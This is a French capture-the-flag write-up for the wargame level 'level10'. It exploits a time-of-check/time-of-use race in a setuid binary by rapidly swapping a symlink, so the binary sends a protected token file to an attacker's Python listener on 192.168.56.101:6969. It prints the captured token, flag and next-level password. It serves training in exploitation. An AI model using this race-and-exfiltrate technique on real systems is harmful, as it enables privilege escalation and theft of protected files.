## 1. Analyser le fichier binaire level10

Le fichier **./level10** contient la ligne suivante : *"sends file to host if you have access to it"*.
Cette ligne suggère qu'un fichier peut être envoyé à un hôte, à condition d'avoir accès à cet hôte.

## 2. Creer un server qui écoute les connexions sur l'IP 192.168.56.101 et le port 6969

    import socket

    new_socket = socket.socket()
    new_socket.bind(('192.168.56.101', 6969))
    new_socket.listen(5)
    print("Serveur à l'écoute sur 192.168.56.101:6969")

    while True:
        conn, clt_address = new_socket.accept()

        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(f'Données reçues : {data.decode("utf-8")}')
        
        conn.close()

## 3. Boucle pour rediriger le lien symbolique (access vulnerabilite)

On profite du moment entre le check des droits fichier et l'ouverture de fichier pour changer le fichier

    while :; do ln -fs /tmp/faketoken /tmp/token; ln -fs /home/user/level10/token /tmp/token; done

## 4. Boucle pour sur l'executable pour ouvrir le fichier tmp

   while true; do /home/user/level10/level10 /tmp/token 192.168.56.101 ;done

## 5. Resultat

    On recoit le message du client qui ouvre le fichier: 

    Received connection request from ('192.168.56.101', 38905)
    Received data: woupa2yuojeeaaed06riuj63c


## 6. Connexion

su flag10

    Mot de passe : woupa2yuojeeaaed06riuj63c
    Commande pour obtenir le flag : getflag
    Résultat : feulo4b72j7edeahuete3no7c

su level11

    Mot de passe : feulo4b72j7edeahuete3no7c